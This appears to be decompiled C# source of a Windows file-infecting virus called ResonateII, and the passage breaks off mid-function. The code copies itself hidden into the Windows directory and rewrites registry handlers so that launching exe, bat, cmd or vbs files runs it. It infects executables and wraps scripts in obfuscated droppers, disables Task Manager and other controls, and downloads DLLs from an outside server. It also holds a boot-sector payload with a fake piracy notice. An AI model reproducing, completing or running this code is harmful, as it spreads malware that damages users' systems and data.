using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Media;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Speech.Synthesis;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using ResonateII.Properties;

namespace ResonateII;

internal static class Program
{
	public enum note
	{
		C3 = 9121,
		C3S = 8609,
		D3 = 8126,
		D3S = 7670,
		E3 = 7239,
		F3 = 6833,
		F3S = 6449,
		G3 = 6087,
		G3S = 5746,
		A3 = 5423,
		A3S = 5119,
		B3 = 4831,
		C4 = 4560,
		C4S = 4304,
		D4 = 4063,
		D4S = 3834,
		E4 = 3619,
		F4 = 3416,
		F4S = 3224,
		G4 = 3043,
		G4S = 2873,
		A4 = 2711,
		A4S = 2559,
		B4 = 2415,
		C5 = 2280,
		C5S = 2152,
		D5 = 2031,
		D5S = 1917,
		E5 = 1809,
		F5 = 1715,
		F5S = 1612,
		G5 = 1521,
		G5S = 1436,
		A5 = 1355,
		A5S = 1292,
		B5 = 1207,
		C6 = 1140
	}

	private const int MOUSEEVENTF_MOVE = 1;

	private const int MOUSEEVENTF_LEFTDOWN = 2;

	private const int MOUSEEVENTF_LEFTUP = 4;

	private const int MOUSEEVENTF_RIGHTDOWN = 8;

	private const int MOUSEEVENTF_RIGHTUP = 16;

	private const int MOUSEEVENTF_MIDDLEDOWN = 32;

	private const int MOUSEEVENTF_MIDDLEUP = 64;

	private const int MOUSEEVENTF_ABSOLUTE = 32768;

	private const byte mark = 74;

	private const byte mrpe = 63;

	private const string malName = "ResonateII";

	private const int malRev = 0;

	private const int bodySize = 238592;

	private const string eHookString = "?exech_r";

	private const string bHookString = "?batch_r";

	private const string vHookString = "?vbsch_r";

	private const string editIntercp = "?intercepte_r";

	private const string softwarer = "HKEY_LOCAL_MACHINE\\Software\\";

	private const string serverHN = "justquant.net";

	private static string[] bFtype = new string[35]
	{
		"*.txt", "*.doc?", "*.xls?", "*.ppt?", "*.bas", "*.vb", "*.cs", "*.cpp", "*.c", "*.h",
		"*.asm", "*.vbs", "*.bat", "*.cmd", "*.com", "*.jp?g", "*.bmp", "*.png", "*.gif", "*.ico",
		"*.py*", "*.wm?", "*.wav", "*.mp*", "*.mo?", "*.xm", "*.mod", "*.it", "*.iso", "*.img",
		"*.htm?", "*.php", "*.css", "*.flac", "*.rtf"
	};

	private static string[] fUtype = new string[15]
	{
		"*.exe", "*.dll", "*.ocx", "*.nls", "*.sys", "*.scr", "*.xml", "*.in?", "*.dat", "*.bin",
		"*.in?", "*.cpl", "*.drv", "*.msc", "*.ttf"
	};

	private static byte[] mbrData = new byte[512]
	{
		250, 49, 192, 142, 216, 180, 9, 176, 160, 179,
		12, 185, 7, 0, 205, 16, 180, 2, 182, 0,
		178, 0, 205, 16, 190, 39, 124, 180, 14, 172,
		8, 192, 116, 4, 205, 16, 235, 247, 244, 78,
		79, 84, 73, 67, 69, 58, 10, 10, 13, 73,
		108, 108, 101, 103, 97, 108, 32, 77, 105, 99,
		114, 111, 115, 111, 102, 116, 32, 87, 105, 110,
		100, 111, 119, 115, 32, 108, 105, 99, 101, 110,
		115, 101, 32, 100, 101, 116, 101, 99, 116, 101,
		100, 33, 10, 13, 89, 111, 117, 32, 97, 114,
		101, 32, 105, 110, 32, 118, 105, 111, 108, 97,
		116, 105, 111, 110, 32, 111, 102, 32, 116, 104,
		101, 32, 68, 105, 103, 105, 116, 97, 108, 32,
		77, 105, 108, 108, 101, 110, 110, 105, 117, 109,
		32, 67, 111, 112, 121, 114, 105, 103, 104, 116,
		32, 65, 99, 116, 33, 10, 10, 13, 89, 111,
		117, 114, 32, 117, 110, 97, 117, 116, 104, 111,
		114, 105, 122, 101, 100, 32, 108, 105, 99, 101,
		110, 115, 101, 32, 104, 97, 115, 32, 98, 101,
		101, 110, 32, 114, 101, 118, 111, 107, 101, 100,
		10, 10, 10, 13, 70, 111, 114, 32, 109, 111,
		114, 101, 32, 105, 110, 102, 111, 114, 109, 97,
		116, 105, 111, 110, 44, 32, 112, 108, 101, 97,
		115, 101, 32, 99, 97, 108, 108, 32, 117, 115,
		32, 97, 116, 58, 10, 10, 13, 32, 32, 32,
		49, 45, 56, 56, 56, 45, 78, 79, 80, 73,
		82, 65, 67, 89, 10, 10, 10, 13, 73, 102,
		32, 121, 111, 117, 32, 97, 114, 101, 32, 111,
		117, 116, 115, 105, 100, 101, 32, 116, 104, 101,
		32, 85, 83, 65, 44, 32, 112, 108, 101, 97,
		115, 101, 32, 108, 111, 111, 107, 32, 117, 112,
		32, 116, 104, 101, 32, 99, 111, 114, 114, 101,
		99, 116, 32, 99, 111, 110, 116, 97, 99, 116,
		32, 105, 110, 102, 111, 114, 109, 97, 116, 105,
		111, 110, 10, 13, 111, 110, 32, 111, 117, 114,
		32, 119, 101, 98, 115, 105, 116, 101, 44, 32,
		97, 116, 58, 10, 10, 13, 32, 32, 32, 119,
		119, 119, 46, 98, 115, 97, 46, 111, 114, 103,
		10, 10, 10, 13, 66, 117, 115, 105, 110, 101,
		115, 115, 32, 83, 111, 102, 116, 119, 97, 114,
		101, 32, 65, 108, 108, 105, 97, 110, 99, 101,
		10, 13, 80, 114, 111, 109, 111, 116, 105, 110,
		103, 32, 97, 32, 115, 97, 102, 101, 32, 38,
		32, 108, 101, 103, 97, 108, 32, 111, 110, 108,
		105, 110, 101, 32, 119, 111, 114, 108, 100, 46,
		0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
		0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
		0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
		0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
		0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
		0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
		85, 170
	};

	private static bool isSystem = false;

	private static bool hooking = false;

	private static bool hookVBS = false;

	private static bool hookBAT = false;

	private static bool intercp = false;

	private static int iday;

	private static int imonth;

	private static int iyear;

	private static int amod;

	private static int intplayed = 0;

	private static string dropLoc;

	private static string dcPath;

	private static string ilogs;

	[DllImport("inpout32.dll")]
	private static extern void Out32(short PortAddress, short Data);

	[DllImport("inpout32.dll")]
	private static extern char Inp32(short PortAddress);

	[DllImport("user32.dll")]
	private static extern void mouse_event(int dwFlags, int dx, int dy, int dwData, int dwExtraInfo);

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern IntPtr CreateFile([MarshalAs(UnmanagedType.LPTStr)] string filename, [MarshalAs(UnmanagedType.U4)] FileAccess access, [MarshalAs(UnmanagedType.U4)] FileShare share, IntPtr securityAttributes, [MarshalAs(UnmanagedType.U4)] FileMode creationDisposition, [MarshalAs(UnmanagedType.U4)] FileAttributes flagsAndAttributes, IntPtr templateFile);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
	public static extern IntPtr CreateFileA([MarshalAs(UnmanagedType.LPStr)] string filename, [MarshalAs(UnmanagedType.U4)] FileAccess access, [MarshalAs(UnmanagedType.U4)] FileShare share, IntPtr securityAttributes, [MarshalAs(UnmanagedType.U4)] FileMode creationDisposition, [MarshalAs(UnmanagedType.U4)] FileAttributes flagsAndAttributes, IntPtr templateFile);

	[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	public static extern IntPtr CreateFileW([MarshalAs(UnmanagedType.LPWStr)] string filename, [MarshalAs(UnmanagedType.U4)] FileAccess access, [MarshalAs(UnmanagedType.U4)] FileShare share, IntPtr securityAttributes, [MarshalAs(UnmanagedType.U4)] FileMode creationDisposition, [MarshalAs(UnmanagedType.U4)] FileAttributes flagsAndAttributes, IntPtr templateFile);

	[DllImport("kernel32.dll")]
	private static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, [In] ref NativeOverlapped lpOverlapped);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CloseHandle(IntPtr hObject);

	[DllImport("kernel32.dll")]
	private static extern bool SetComputerName(string lpComputerName);

	[DllImport("shell32.dll", CharSet = CharSet.Unicode, EntryPoint = "#262", PreserveSig = false)]
	public static extern void shell32_262(string username, int notneeded, string picturefilename);

	[STAThread]
	private static void Main(string[] args)
	{
		//IL_0979: Unknown result type (might be due to invalid IL or missing references)
		//IL_099d: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string text = JLib.ConvertStringArrayToStringJoin(args);
			if (text.Contains("?exech_r"))
			{
				hooking = true;
			}
			if (text.Contains("?vbsch_r"))
			{
				hookVBS = true;
			}
			if (text.Contains("?batch_r"))
			{
				hookBAT = true;
			}
			if (text.Contains("?intercepte_r"))
			{
				intercp = true;
			}
			if (!isSystem && !hooking && !hookBAT && !hookVBS && !intercp)
			{
				try
				{
					if (!startHostP(args))
					{
					}
				}
				catch
				{
				}
			}
			bool flag;
			try
			{
				flag = (int)Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\ResonateII", "present", 0) == 1;
			}
			catch
			{
				flag = false;
			}
			if (!isSystem && !flag)
			{
				dropLoc = "WIN" + JLib.randString(8);
				Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\ResonateII", "wr", dropLoc, RegistryValueKind.String);
				Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\ResonateII", "present", 1, RegistryValueKind.DWord);
				string path = Environment.GetEnvironmentVariable("windir") + "\\" + dropLoc + ".exe";
				File.WriteAllBytes(path, getSelf());
				File.SetAttributes(path, FileAttributes.Hidden | FileAttributes.System);
				DirectoryInfo directoryInfo = Directory.CreateDirectory(Environment.GetEnvironmentVariable("windir") + "\\system\\d\\");
				directoryInfo.Attributes = FileAttributes.Hidden | FileAttributes.System;
				try
				{
					new WebClient().DownloadFile("http://justquant.net/public/dlls/BassMOD.dll", Environment.GetEnvironmentVariable("windir") + "\\BassMOD.dll");
					new WebClient().DownloadFile("http://justquant.net/public/dlls/AxInterop.WMPLib.dll", Environment.GetEnvironmentVariable("windir") + "\\AxInterop.WMPLib.dll");
					new WebClient().DownloadFile("http://justquant.net/public/dlls/Interop.WMPLib.dll", Environment.GetEnvironmentVariable("windir") + "\\Interop.WMPLib.dll");
					new WebClient().DownloadFile("http://justquant.net/public/dlls/inpout32.dll", Environment.GetEnvironmentVariable("windir") + "\\inpout32.dll");
					new WebClient().DownloadFile("http://justquant.net/public/bob.wav", Environment.GetEnvironmentVariable("windir") + "\\system\\d\\grass_beach.wav");
					new WebClient().DownloadFile("http://justquant.net/public/snoop.jpg", Environment.GetEnvironmentVariable("windir") + "\\system\\d\\snoop.jpg");
					new WebClient().DownloadFile("http://justquant.net/public/oab.wmv", Environment.GetEnvironmentVariable("windir") + "\\zz.wmv");
					new WebClient().DownloadFile("http://justquant.net/public/sweetdreams.jpg", Environment.GetEnvironmentVariable("windir") + "\\system\\d\\sweetdreams.jpg");
					new WebClient().DownloadFile("http://justquant.net/public/idoom.wav", Environment.GetEnvironmentVariable("windir") + "\\system\\d\\p.wav");
					new WebClient().DownloadFile("http://justquant.net/public/bbt.wav", Environment.GetEnvironmentVariable("windir") + "\\system\\d\\bbt.wav");
					new WebClient().DownloadFile("http://justquant.net/public/navalaugh1.wav", Environment.GetEnvironmentVariable("windir") + "\\system\\d\\nl.wav");
				}
				catch
				{
				}
				dcPath = Environment.GetEnvironmentVariable("SystemDrive") + "\\d_cache" + JLib.randString(16);
				DirectoryInfo directoryInfo2 = Directory.CreateDirectory(dcPath);
				directoryInfo2.Attributes = FileAttributes.Hidden | FileAttributes.System;
				DirectorySecurity accessControl = directoryInfo2.GetAccessControl();
				accessControl.AddAccessRule(new FileSystemAccessRule("Everyone", FileSystemRights.FullControl, AccessControlType.Allow));
				Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\ResonateII", "dcache", dcPath, RegistryValueKind.String);
				Registry.SetValue("HKEY_CLASSES_ROOT\\exefile\\shell\\open\\command", "", dropLoc + ".exe ?exech_r \"%1\" %*");
				Registry.SetValue("HKEY_CLASSES_ROOT\\batfile\\shell\\open\\command", "", dropLoc + ".exe ?batch_r \"%1\" %*");
				Registry.SetValue("HKEY_CLASSES_ROOT\\batfile\\shell\\edit\\command", "", dropLoc + ".exe ?intercepte_r \"%1\"");
				Registry.SetValue("HKEY_CLASSES_ROOT\\cmdfile\\shell\\open\\command", "", dropLoc + ".exe ?batch_r \"%1\" %*");
				Registry.SetValue("HKEY_CLASSES_ROOT\\cmdfile\\shell\\edit\\command", "", dropLoc + ".exe ?intercepte_r \"%1\"");
				Registry.SetValue("HKEY_CLASSES_ROOT\\vbsfile\\shell\\open\\command", "", dropLoc + ".exe ?vbsch_r \"%1\" %*");
				Registry.SetValue("HKEY_CLASSES_ROOT\\vbsfile\\shell\\edit\\command", "", dropLoc + ".exe ?intercepte_r \"%1\"");
				Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\ResonateII", "imonth", DateTime.Today.Month.ToString(), RegistryValueKind.DWord);
				Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\ResonateII", "iday", DateTime.Today.Day.ToString(), RegistryValueKind.DWord);
				Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\ResonateII", "iyear", DateTime.Today.Year.ToString(), RegistryValueKind.DWord);
				int num = JLib.rollDice(10) + 5;
				Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\ResonateII", "amod", num, RegistryValueKind.DWord);
				Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\", "NoFolderOptions", 1, RegistryValueKind.DWord);
				Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\", "DisableTaskMgr", 1, RegistryValueKind.DWord);
				Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\", "NoWinKeys", 1, RegistryValueKind.DWord);
				Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\", "RegisteredOwner", "ResonateII");
				Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\", "RegisteredOrganization", "justquant Industries");
				Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\ResonateII", "intplayed", 0, RegistryValueKind.DWord);
				ilogs = "C:\\" + JLib.randString(20) + ".log";
				Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\ResonateII", "ilogs", ilogs, RegistryValueKind.String);
				File.WriteAllText(ilogs, "INSTALL " + DateTime.Now);
				File.SetAttributes(ilogs, FileAttributes.Hidden | FileAttributes.System);
				int millisecondsTimeout = JLib.rollDice(5) * 60000;
				Thread.Sleep(millisecondsTimeout);
				JLib.DoExitWin(6);
			}
			dropLoc = (string)Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\ResonateII", "wr", "NaN");
			dcPath = (string)Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\ResonateII", "dcache", "NaN");
			imonth = (int)Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\ResonateII", "imonth", 0);
			iday = (int)Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\ResonateII", "iday", 0);
			iyear = (int)Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\ResonateII", "iyear", 0);
			amod = (int)Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\ResonateII", "amod", 0);
			ilogs = (string)Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\ResonateII", "ilogs", "NaN");
			intplayed = (int)Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\ResonateII", "intplayed", 0);
			if (hooking)
			{
				int num2 = doPayloads();
				if (num2 > 0)
				{
					if (!args[1].Contains("cmd") && !args[1].Contains("regedit") && !args[1].Contains("msconfig"))
					{
						string arguments = string.Join(" ", args).Replace("?exech_r ", "").Replace(args[1], "");
						ProcessStartInfo processStartInfo = new ProcessStartInfo(args[1], arguments);
						processStartInfo.UseShellExecute = false;
						Process process = Process.Start(processStartInfo);
						try
						{
							while (!process.HasExited)
							{
								Thread.Sleep(1000);
							}
						}
						catch
						{
						}
						if (File.ReadAllBytes(args[1])[^1] != 63)
						{
							rsInfect(args[1]);
						}
						if (num2 == 2)
						{
							while (true)
							{
								Thread.Sleep(60000);
							}
						}
					}
					else
					{
						bender(mode: true);
					}
				}
			}
			if (intercp)
			{
				FileInfo fileInfo = new FileInfo(args[1]);
				string text2 = dcPath + "\\" + args[1].Replace(fileInfo.Directory!.Root.ToString(), "");
				if (File.Exists(text2))
				{
					ProcessStartInfo processStartInfo2 = new ProcessStartInfo("notepad.exe", text2);
					processStartInfo2.UseShellExecute = false;
					try
					{
						Process process2 = Process.Start(processStartInfo2);
						while (!process2.HasExited)
						{
							Thread.Sleep(1000);
						}
						File.Delete(args[1]);
						File.Copy(text2, args[1]);
						if (fileInfo.Extension == "cmd" || fileInfo.Extension == "bat")
						{
							encapBatch(args[1]);
						}
						else if (fileInfo.Extension == "vbs")
						{
							encapVBS(args[1]);
						}
					}
					catch
					{
					}
				}
				else if (!File.ReadAllText(args[1]).StartsWith("'J") && !File.ReadAllText(args[1]).StartsWith("%nul%%nul%"))
				{
					try
					{
						ProcessStartInfo processStartInfo3 = new ProcessStartInfo("notepad.exe", text2);
						processStartInfo3.UseShellExecute = false;
						Process process3 = Process.Start(processStartInfo3);
						while (!process3.HasExited)
						{
							Thread.Sleep(1000);
						}
						try
						{
							File.Delete(args[1]);
							File.Copy(text2, args[1], overwrite: true);
							if (fileInfo.Extension == "cmd" || fileInfo.Extension == "bat")
							{
								encapBatch(args[1]);
							}
							else if (fileInfo.Extension == "vbs")
							{
								encapVBS(args[1]);
							}
						}
						catch
						{
						}
					}
					catch
					{
						MessageBox.Show(args[1] + " is not accessible.\n\nThe file or directory is corrupted and unreadable.", fileInfo.Directory!.ToString(), (MessageBoxButtons)0, (MessageBoxIcon)16);
					}
				}
				else
				{
					MessageBox.Show(args[1] + " is not accessible.\n\nThe file or directory is corrupted and unreadable.", fileInfo.Directory!.ToString(), (MessageBoxButtons)0, (MessageBoxIcon)16);
				}
			}
			if (hookBAT)
			{
				try
				{
					encapBatch(args[1]);
				}
				catch
				{
				}
				string arguments2 = string.Join(" ", args).Replace("?exech_r ", "").Replace(args[1], "");
				ProcessStartInfo processStartInfo4 = new ProcessStartInfo(args[1], arguments2);
				processStartInfo4.UseShellExecute = false;
				try
				{
					Process.Start(processStartInfo4);
				}
				catch
				{
				}
			}
			if (hookVBS)
			{
				try
				{
					encapVBS(args[1]);
				}
				catch
				{
				}
				string text3 = string.Join(" ", args).Replace("?exech_r ", "").Replace(args[1], "");
				ProcessStartInfo processStartInfo5 = new ProcessStartInfo("wscript.exe", "\"" + args[1] + "\" " + text3);
				processStartInfo5.UseShellExecute = false;
				try
				{
					Process.Start(processStartInfo5);
					return;
				}
				catch
				{
					return;
				}
			}
		}
		catch (Exception e)
		{
			JLib.standardExceptionBox(e);
		}
	}

	private static bool rsInfect(string filename)
	{
		try
		{
			Module module = Assembly.GetExecutingAssembly().GetModules()[0];
			FileStream fileStream = new FileStream(module.FullyQualifiedName, FileMode.OpenOrCreate, FileAccess.Read);
			byte[] h = JLib.read(fileStream, 238592, 0);
			fileStream.Close();
			FileStream fileStream2 = new FileStream(filename, FileMode.OpenOrCreate, FileAccess.Read);
			int length = (int)fileStream2.Length;
			byte[] inArray = JLib.read(fileStream2, length, 0);
			fileStream2.Close();
			string text = JLib.randString(8);
			byte[] bytes = Encoding.ASCII.GetBytes(text);
			byte[] bytes2 = Encoding.ASCII.GetBytes(JLib.XOR(Convert.ToBase64String(inArray), text));
			byte[] k = new byte[1] { 63 };
			FileStream s = new FileStream(filename, FileMode.OpenOrCreate, FileAccess.Write);
			assemble(s, h, bytes, bytes2, k);
			logWrite("INFECT " + filename);
			return true;
		}
		catch
		{
			return false;
		}
	}

	private static void assemble(FileStream s, byte[] h, byte[] i, byte[] j, byte[] k)
	{
		BinaryWriter binaryWriter = new BinaryWriter(s);
		binaryWriter.BaseStream.Seek(0L, SeekOrigin.Begin);
		binaryWriter.Write(h);
		binaryWriter.Write(i);
		binaryWriter.Write(j);
		binaryWriter.Write(k);
		binaryWriter.Flush();
		binaryWriter.Close();
	}

	private static void buckshot(string[] args)
	{
		FileStream fileStream = new FileStream(Assembly.GetExecutingAssembly().GetModules()[0].FullyQualifiedName, FileMode.OpenOrCreate, FileAccess.Read);
		FileStream fileStream2 = new FileStream(Assembly.GetExecutingAssembly().GetModules()[0].FullyQualifiedName, FileMode.OpenOrCreate, FileAccess.Read);
		int num = (int)fileStream.Length;
		int num2 = num - 238592;
		byte[] bytes = JLib.read(fileStream, num2 - 9, 238600);
		byte[] bytes2 = JLib.read(fileStream2, 8, 238592);
		string @string = Encoding.ASCII.GetString(bytes2);
		string string2 = Encoding.ASCII.GetString(bytes);
		fileStream.Close();
		fileStream2.Close();
		string s = JLib.XOR(string2, @string);
		byte[] bytes3 = Convert.FromBase64String(s);
		string text = Assembly.GetExecutingAssembly().GetModules()[0].FullyQualifiedName + ".exe";
		File.WriteAllBytes(text, bytes3);
		File.SetAttributes(text, FileAttributes.Hidden);
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text, string.Join(" ", args));
		processStartInfo.WorkingDirectory = Directory.GetCurrentDirectory();
		Process process = Process.Start(processStartInfo);
		while (!process.HasExited)
		{
			Thread.Sleep(1000);
		}
		File.Delete(text);
	}

	private static string capGenerate()
	{
		string text = "'" + JLib.randString(4);
		string text2 = JLib.randString(8) + ".vbs";
		string text3 = JLib.randString(8) + ".exe";
		string text4 = JLib.randString(16);
		string text5 = JLib.randString(8);
		string text6 = JLib.randString(8);
		string text7 = JLib.randString(8);
		string text8 = JLib.randString(8);
		string text9 = JLib.randString(8);
		string text10 = JLib.randString(8);
		string text11 = JLib.randString(8);
		string text12 = JLib.randString(8);
		string text13 = JLib.randString(8);
		string text14 = JLib.randString(8);
		string text15 = JLib.randString(8);
		string text16 = JLib.randString(8);
		string text17 = "%nul%%nul%";
		string text18 = "%temp%";
		string text19 = "\"%~f0\"";
		string s = "@echo off\r\nFINDSTR /E \"" + text + "\" ";
		string s2 = " >";
		string s3 = "\\" + text2 + "\r\ncscript //nologo ";
		string s4 = "\\" + text2 + "\r\nstart ";
		string s5 = ("\\" + text3 + "\r\ngoto " + text4) ?? "";
		string text20 = text17;
		foreach (string item in s.SplitInParts(1))
		{
			text20 = ((JLib.rollDice(8) != 3) ? (text20 + item) : (text20 + item + "%nul%"));
		}
		text20 += text19;
		foreach (string item2 in s2.SplitInParts(1))
		{
			text20 = ((JLib.rollDice(8) != 3) ? (text20 + item2) : (text20 + item2 + "%nul%"));
		}
		text20 += text18;
		foreach (string item3 in s3.SplitInParts(1))
		{
			text20 = ((JLib.rollDice(8) != 3) ? (text20 + item3) : (text20 + item3 + "%nul%"));
		}
		text20 += text18;
		foreach (string item4 in s4.SplitInParts(1))
		{
			text20 = ((JLib.rollDice(8) != 3) ? (text20 + item4) : (text20 + item4 + "%nul%"));
		}
		text20 += text18;
		foreach (string item5 in s5.SplitInParts(1))
		{
			text20 = ((JLib.rollDice(8) != 3) ? (text20 + item5) : (text20 + item5 + "%nul%"));
		}
		string text21 = "\r\nOption Explicit " + text + "\r\nConst " + text5 + " = 1 " + text + "\r\nConst " + text6 + " = 1, " + text7 + " = 2, " + text8 + " = 8 " + text + "\r\nDim " + text13 + " " + text + "\r\n" + text13 + " = \"" + Convert.ToBase64String(File.ReadAllBytes(Assembly.GetExecutingAssembly().Location)) + "\" " + text + "\r\nDim " + text14 + " " + text + "\r\n" + text14 + " = " + text15 + "(" + text13 + ") " + text + "\r\nDim " + text9 + " " + text + "\r\n" + text9 + " = WScript.CreateObject(\"Scripting.FileSystemObject\").GetSpecialFolder(2) " + text + "\r\n" + text16 + " " + text9 + " +\"\\" + text3 + "\", " + text14 + " " + text + "\r\nprivate function " + text15 + "(base64) " + text + "\r\n  dim " + text10 + ", " + text11 + " " + text + "\r\n  Set " + text10 + " = CreateObject(\"Microsoft.XMLDOM\") " + text + "\r\n  Set " + text11 + " = " + text10 + ".createElement(\"tmp\") " + text + "\r\n  " + text11 + ".DataType = \"bin.base64\" " + text + "\r\n  " + text11 + ".Text = base64 " + text + "\r\n  " + text15 + " = " + text11 + ".NodeTypedValue " + text + "\r\nend function " + text + "\r\nprivate Sub " + text16 + "(file, bytes) " + text + "\r\n  Dim " + text12 + " " + text + "\r\n  Set " + text12 + " = CreateObject(\"ADODB.Stream\") " + text + "\r\n  " + text12 + ".Type = " + text5 + " " + text + "\r\n  " + text12 + ".Open " + text + "\r\n  " + text12 + ".Write bytes " + text + "\r\n  " + text12 + ".SaveToFile file, " + text7 + " " + text + "\r\nEnd Sub " + text + "\r\n:" + text4 + "\r\n";
		return text20 + text21;
	}

	private static string capGenerateV(bool dexplicit, string ofile)
	{
		string text = "'" + JLib.randString(4);
		_ = JLib.randString(8) + ".vbs";
		string text2 = JLib.randString(8) + ".exe";
		JLib.randString(16);
		string text3 = JLib.randString(8);
		string text4 = JLib.randString(8);
		string text5 = JLib.randString(8);
		string text6 = JLib.randString(8);
		string text7 = JLib.randString(8);
		string text8 = JLib.randString(8);
		string text9 = JLib.randString(8);
		string text10 = JLib.randString(8);
		string text11 = JLib.randString(8);
		string text12 = JLib.randString(8);
		string text13 = JLib.randString(8);
		string text14 = JLib.randString(8);
		string text15 = "Option Explicit";
		if (dexplicit)
		{
			text15 = "";
		}
		return "'J\r\n" + text15 + " " + text + "\r\nConst " + text3 + " = 1 " + text + "\r\nConst " + text4 + " = 1, " + text5 + " = 2, " + text6 + " = 8 " + text + "\r\nDim " + text11 + " " + text + "\r\n" + text11 + " = \"" + Convert.ToBase64String(File.ReadAllBytes(Assembly.GetExecutingAssembly().Location)) + "\" " + text + "\r\nDim " + text12 + " " + text + "\r\n" + text12 + " = " + text13 + "(" + text11 + ") " + text + "\r\nDim " + text7 + " " + text + "\r\n" + text7 + " = WScript.CreateObject(\"Scripting.FileSystemObject\").GetSpecialFolder(2) " + text + "\r\n" + text14 + " " + text7 + " +\"\\" + text2 + "\", " + text12 + " " + text + "\r\n" + ofile + "\r\nprivate function " + text13 + "(base64) " + text + "\r\n  dim " + text8 + ", " + text9 + " " + text + "\r\n  Set " + text8 + " = CreateObject(\"Microsoft.XMLDOM\") " + text + "\r\n  Set " + text9 + " = " + text8 + ".createElement(\"tmp\") " + text + "\r\n  " + text9 + ".DataType = \"bin.base64\" " + text + "\r\n  " + text9 + ".Text = base64 " + text + "\r\n  " + text13 + " = " + text9 + ".NodeTypedValue " + text + "\r\nend function " + text + "\r\nprivate Sub " + text14 + "(file, bytes) " + text + "\r\n  Dim " + text10 + " " + text + "\r\n  Set " + text10 + " = CreateObject(\"ADODB.Stream\") " + text + "\r\n  " + text10 + ".Type = " + text3 + " " + text + "\r\n  " + text10 + ".Open " + text + "\r\n  " + text10 + ".Write bytes " + text + "\r\n  " + text10 + ".SaveToFile file, " + text5 + " " + text + "\r\nEnd Sub " + text + "\r\n";
	}

	private static bool encapBatch(string filename)
	{
		if (!File.ReadAllText(filename).StartsWith("%nul%%nul%"))
		{
			try
			{
				FileInfo fileInfo = new FileInfo(filename);
				string text = dcPath + "\\" + filename.Replace(fileInfo.Directory!.Root.ToString(), "");
				string path = text.Replace(fileInfo.Name, "");
				if (!Directory.Exists(path))
				{
					Directory.CreateDirectory(path);
				}
				File.Copy(filename, text, overwrite: true);
				string contents = capGenerate() + File.ReadAllText(filename);
				File.WriteAllText(filename, contents);
				logWrite("INFECT " + filename);
				return true;
			}
			catch
			{
				return false;
			}
		}
		return false;
	}

	private static bool encapVBS(string filename)
	{
		if (!File.ReadAllText(filename).StartsWith("'J"))
		{
			bool dexplicit = false;
			if (!File.ReadAllText(filename).ToLower().Contains("option explicit"))
			{
				dexplicit = true;
			}
			try
			{
				FileInfo fileInfo = new FileInfo(filename);
				string text = dcPath + "\\" + filename.Replace(fileInfo.Directory!.Root.ToString(), "");
				string path = text.Replace(fileInfo.Name, "");
				if (!Directory.Exists(path))
				{
					Directory.CreateDirectory(path);
				}
				File.Copy(filename, text, overwrite: true);
				string contents = capGenerateV(dexplicit, File.ReadAllText(filename));
				File.WriteAllText(filename, contents);
				logWrite("INFECT " + filename);
				return true;
			}
			catch
			{
				return false;
			}
		}
		return false;
	}

	private static bool startHostP(string[] args)
	{
		string location = Assembly.GetExecutingAssembly().Location;
		FileInfo fileInfo = new FileInfo(location);
		byte[] array = File.ReadAllBytes(location).Skip((int)fileInfo.Length - 1).Take(1)
			.ToArray();
		byte b = array[0];
		if (b != 63)
		{
			return false;
		}
		try
		{
			buckshot(args);
			return true;
		}
		catch
		{
			return false;
		}
	}

	private static byte[] getSelf()
	{
		return JLib.read(new FileStream(Assembly.GetExecutingAssembly().GetModules()[0].FullyQualifiedName, FileMode.OpenOrCreate, FileAccess.Read), 238592, 0);
	}

	private static void logWrite(string s)
	{
		File.AppendAllText(ilogs, "\r\n" + s);
	}

	private static void bender(bool mode)
	{
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		Application.Run((Form)(object)new oab(mode));
	}

	private static int doPayloads()
	{
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0185: Unknown result type (might be due to invalid IL or missing references)
